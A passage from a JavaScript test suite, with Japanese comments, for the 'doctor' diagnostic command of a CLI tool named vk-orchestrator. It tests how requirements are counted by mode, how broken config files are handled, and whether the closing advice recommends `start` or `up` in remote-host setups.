    // github モードで owner 未設定・gh 未認証・assigneeFilter 未設定・allowed_owners 未設定が欠損。
    assert.ok(ids.includes('gh-auth'));
    assert.ok(ids.includes('github.owner'));
    assert.ok(ids.includes('orchestrator.assigneeFilter'));
    assert.ok(ids.includes('org.allowed_owners'));
  });
});

test('summarizeDoctor: モードで required 集合が変わり要約カウントに反映される', () => {
  const localSummary = withDoctorEnv(
    { queueBackend: 'local', config: {}, allowedOwners: ['vektor-inc'] },
    (options) => summarizeDoctor(runDoctor(options)),
  );
  const githubSummary = withDoctorEnv(
    { queueBackend: 'github', config: {}, allowedOwners: ['vektor-inc'] },
    (options) => summarizeDoctor(runDoctor(options)),
  );
  // GitHub モードのほうが required 件数が多い（gh/owner/repo/assigneeFilter が加わる）。
  assert.ok(githubSummary.requiredCount > localSummary.requiredCount);
});

test('formatDoctorReport: 充足時は up 案内、欠損時は /vk-orchestrator-setup 案内を含む', () => {
  withDoctorEnv({ queueBackend: 'local', config: {}, allowedOwners: ['vektor-inc'] }, (options) => {
    const report = formatDoctorReport(runDoctor(options));
    assert.match(report, /vk-orchestrator up/);
    assert.match(report, /✅/);
  });
  withDoctorEnv({ queueBackend: 'github', config: {}, ghAuthenticated: false }, (options) => {
    const report = formatDoctorReport(runDoctor(options));
    assert.match(report, /vk-orchestrator-setup/);
    assert.match(report, /❌/);
  });
});

test('runDoctor: 壊れた config.json（不正 JSON）では例外を投げる（bin 側で友好的に扱う前提）', () => {
  const dir = mkdtempSync(join(tmpdir(), 'vko-doctor-broken-'));
  try {
    const configPath = join(dir, 'config.json');
    writeFileSync(configPath, '{ broken json');
    // config を注入せず configPath だけ渡すと、内部の loadUnifiedConfig が不正 JSON で throw する。
    assert.throws(() => runDoctor({ configPath }), /読み込みに失敗/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('bin doctor: 壊れた config でも生クラッシュせず友好的メッセージで終了する（人間可読）', () => {
  const dir = mkdtempSync(join(tmpdir(), 'vko-doctor-cli-'));
  try {
    const configPath = join(dir, 'config.json');
    writeFileSync(configPath, '{ broken json');
    const result = spawnSync(process.execPath, [BIN_PATH, 'doctor'], {
      encoding: 'utf8',
      env: { ...process.env, VK_ORCHESTRATOR_CONFIG: configPath },
    });
    // 生スタックで落ちない（診断コマンドは exit 0）。
    assert.equal(result.status, 0);
    const out = `${result.stdout}\n${result.stderr}`;
    assert.match(out, /\[doctor\] 設定の読み込みに失敗しました/);
    // 生の Node スタック（"at loadUnifiedConfig ..."）を握りつぶしていること。
    assert.doesNotMatch(out, /^\s*at loadUnifiedConfig/m);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('bin doctor --json: 壊れた config でも生クラッシュせず stdout を汚さない', () => {
  const dir = mkdtempSync(join(tmpdir(), 'vko-doctor-cli-json-'));
  try {
    const configPath = join(dir, 'config.json');
    writeFileSync(configPath, '{ broken json');
    const result = spawnSync(process.execPath, [BIN_PATH, 'doctor', '--json'], {
      encoding: 'utf8',
      env: { ...process.env, VK_ORCHESTRATOR_CONFIG: configPath },
    });
    assert.equal(result.status, 0);
    // stdout には要件配列を出さない（部分的な壊れた JSON を吐かない）。エラーは stderr に JSON で。
    assert.equal(result.stdout.trim(), '');
    assert.match(result.stderr, /"hint"/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// 別マシン構成での締めの案内（issue #256-3）
//
// README は別マシン構成に「`up` ではなく `start` を使い」と案内しているのに、
// doctor は必須項目が揃うと常に `up` を勧めていた。別マシン構成では GUI は接続先に
// あるので、手元で `up`（GUI 起動込み）を実行しても意味がない。
// ---------------------------------------------------------------------------

// 別マシン構成（vk-terminals モード＋接続先が手元以外）で必須項目が全充足する env。
function withRemoteHostDoctorEnv(extra, fn) {
  return withDoctorEnv(
    {
      terminalsMode: 'vk-terminals',
      vkTerminalsApiHost: '100.64.0.3',
      localMachineAddresses: ['127.0.0.1', '100.64.0.2'],
      localMachineHostnames: ['vko-test-machine'],
      claudeInstalled: false,
      queueBackend: 'local',
      allowedOwners: ['vektor-inc'],
      ...extra,
    },
    fn,
  );
}

test('runDoctor: 別マシン構成のとき claude 要件が runsOnRemoteHost を持つ（issue #256-3）', () => {
  // 締めの案内を切り替える判断材料。required === false を間接的な合図に使うと、
  // 「未導入なので任意」と「別マシンなので任意」の区別が付かない。
  withRemoteHostDoctorEnv({}, (options) => {
    assert.equal(byId(runDoctor(options), 'claude').runsOnRemoteHost, true);
  });
  // 手元構成では従来どおりフラグを生やさない（--json の出力を変えない）。
  withDoctorEnv({ queueBackend: 'local', allowedOwners: ['vektor-inc'] }, (options) => {
    assert.equal(Object.hasOwn(byId(runDoctor(options), 'claude'), 'runsOnRemoteHost'), false);
  });
});

test('formatDoctorReport: 別マシン構成の締めは `start` を勧める（issue #256-3）', () => {
  // 手元に Claude Code がある構成（/vk-orchestrator-setup を通った人はほぼこちら）。
  withRemoteHostDoctorEnv({ claudeInstalled: true }, (options) => {
    const reqs = runDoctor(options);
    const summary = summarizeDoctor(reqs);
    assert.equal(summary.allRequiredOk, true, '前提: 必須項目はすべて充足していること');
    const report = formatDoctorReport(reqs, summary);
    const tail = report.trimEnd().split('\n').slice(-2);
    // 最終行が行動、その上が前提（なぜ `up` ではないのか）。
    assert.deepEqual(tail, [
      '   ペインは接続先（100.64.0.3）のマシンで開くため、手元の GUI を起動する `up` は使いません。',
      '   `vk-orchestrator start` で起動できます。',
    ]);
    // 値を含む行とコマンドを含む行は必ず分ける（issue #253 と同じ型の穴を作らない）。
    assert.ok(!tail[1].includes('100.64.0.3'));
    // 手元で GUI を起動する `up` は勧めない（README と食い違わせない）。
    assert.doesNotMatch(report, /`vk-orchestrator up` で起動/);
  });
});

test('formatDoctorReport: 別マシン構成で手元に claude が無ければ接続先の確認を促す（issue #256-3）', () => {
  // ⚠️ の行は未充足リストに載らないので hint はレポートに出ない。「接続先で claude が
  // 動くか確認して」と言える場所が締めしか無い。
  withRemoteHostDoctorEnv({ claudeInstalled: false }, (options) => {
    const reqs = runDoctor(options);
    const summary = summarizeDoctor(reqs);
    assert.equal(summary.allRequiredOk, true, '前提: 必須項目はすべて充足していること');
    assert.deepEqual(formatDoctorReport(reqs, summary).trimEnd().split('\n').slice(-2), [
      '   ペインは接続先（100.64.0.3）のマシンで開きます。そちらで `claude --version` が動くかご確認ください。',
      '   `vk-orchestrator start` で起動できます。',
    ]);
  });
});

test('runDoctor: 締めの理由行に出す接続先は hint と同じ整形を共有する（issue #256-3）', () => {
  // 表示経路を増やさない（apiHost の切り詰め・制御文字除去は sanitizeReportValue の
  // 1 か所で済ませる）。別々に組み立てると、同じ値が締めと hint で違う見た目になる。
  withRemoteHostDoctorEnv({ claudeInstalled: false }, (options) => {
    const claude = byId(runDoctor(options), 'claude');
    assert.equal(claude.remoteHostText, '接続先（100.64.0.3）');
    assert.ok(claude.hint.includes(claude.remoteHostText));
  });
});

test('formatDoctorReport: 別マシン構成＋制御文字の注記でも `start` を勧める（issue #256-3）', () => {
  withRemoteHostDoctorEnv({ allowedOwners: ['vektor-inc', `other${BEL}`] }, (options) => {
    const reqs = runDoctor(options);
    const summary = summarizeDoctor(reqs);
    assert.equal(summary.allRequiredOk, true, '前提: 必須項目はすべて充足していること');
    const report = formatDoctorReport(reqs, summary);
    assert.equal(
      report.trimEnd().split('\n').at(-1),
      '   上の ⚠️ を確認してから `vk-orchestrator start` で起動してください。',
    );
  });
});

test('formatDoctorReport: tmux モードでは接続先に関わらず `up` を勧める（issue #256-3）', () => {
  // tmux モードは常に手元で claude を起動するので、接続先の設定では切り替えない。
  withDoctorEnv(
    {
      terminalsMode: 'tmux',
      vkTerminalsApiHost: '100.64.0.3',
      queueBackend: 'local',
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const reqs = runDoctor(options);
      assert.equal(summarizeDoctor(reqs).allRequiredOk, true, '前提: 必須項目はすべて充足していること');
      assert.equal(Object.hasOwn(byId(reqs, 'claude'), 'runsOnRemoteHost'), false);
      assert.match(formatDoctorReport(reqs), /^ {3}`vk-orchestrator up` で起動できます。$/m);
    },
  );
});
